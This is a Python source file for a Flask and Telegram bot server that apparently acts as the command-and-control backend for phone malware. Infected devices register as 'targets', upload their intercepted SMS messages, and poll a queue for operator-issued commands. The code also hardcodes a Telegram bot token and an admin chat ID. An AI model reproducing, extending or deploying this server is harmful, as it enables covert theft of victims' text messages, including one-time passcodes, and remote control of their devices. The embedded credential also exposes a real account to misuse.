import os
from flask import Flask, request, jsonify
import sqlite3
import telebot
import threading
import time

# --- Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8701795551:AAHaRAYZY1B1ZOSCkt9QmROuvgRhL0u4_Mk")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "8034881242"))
DB_NAME = "database.db"

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

# Queue for device commands
command_queue = {}

# ========================
# Database Setup
# ========================
def init_db():
    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT UNIQUE,
                  name TEXT,
                  mobile TEXT,
                  pin TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS sms_logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT,
                  sender TEXT,
                  message TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

# ========================
# Telegram Bot Handlers
# ========================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.chat.id != ADMIN_CHAT_ID:
        return
    bot.reply_to(message, "✅ **Admin Bot Active**\n\n"
                          "Use /status to check online devices.")

@bot.message_handler(commands=['status'])
def status(message):
    if message.chat.id != ADMIN_CHAT_ID:
        return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    bot.reply_to(message, f"📊 **Total Devices Online**: `{count}`")

# ========================
# Flask Routes
# ========================
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('device_id')
    
    if device_id:
        bot.send_message(ADMIN_CHAT_ID, 
                        f"👤 *New Target Online*\nID: `{device_id}`", 
                        parse_mode='Markdown')
    
    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (device_id, name, mobile) VALUES (?, ?, ?)",
              (device_id, data.get('name'), data.get('mobile')))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"}), 200


@app.route('/log_sms', methods=['POST'])
def log_sms():
    data = request.json
    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT INTO sms_logs (device_id, sender, message) VALUES (?, ?, ?)",
              (data.get('device_id'), data.get('sender'), data.get('message')))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"}), 200


@app.route('/admin/send_command', methods=['POST'])
def admin_send_command():
    data = request.json
    device_id = data.get('device_id')
    cmd_type = data.get('type')
    payload = data.get('payload')

    if not device_id or not cmd_type:
        return jsonify({"status": "error", "message": "Missing data"}), 400

    if device_id not in command_queue:
        command_queue[device_id] = []
    
    command_queue[device_id].append({
        "type": cmd_type,
        "payload": payload
    })
    
    print(f"✅ Command queued for {device_id}: {cmd_type}")
    return jsonify({"status": "queued"}), 200


@app.route('/get_commands', methods=['GET'])
def get_commands():
    device_id = request.args.get('device_id')
    if device_id in command_queue and len(command_queue[device_id]) > 0:
        commands = command_queue[device_id].copy()
        command_queue[device_id] = []  # Clear after sending
        return jsonify({"commands": commands}), 200
    return jsonify({"commands": []}), 200


@app.route('/admin/get_data', methods=['GET'])
def get_admin_data():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM users")
    users = [dict(row) for row in c.fetchall()]
    c.execute("SELECT * FROM sms_logs ORDER BY timestamp DESC LIMIT 100")
    logs = [dict(row) for row in c.fetchall()]
    conn.close()
    return jsonify({"users": users, "logs": logs}), 200


# ========================
# Run Bot in Background
# ========================
def run_bot():
    while True:
        try:
            print("🤖 Telegram Bot Polling Started...")
            bot.infinity_polling(timeout=30, long_polling_timeout=30)
        except Exception as e:
            print(f"❌ Bot Error: {e}")
            print("🔄 Restarting bot in 10 seconds...")
            time.sleep(10)


if __name__ == '__main__':
    init_db()
    
    # Start Telegram Bot in separate thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    print("🚀 API Server + Bot Started!")
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
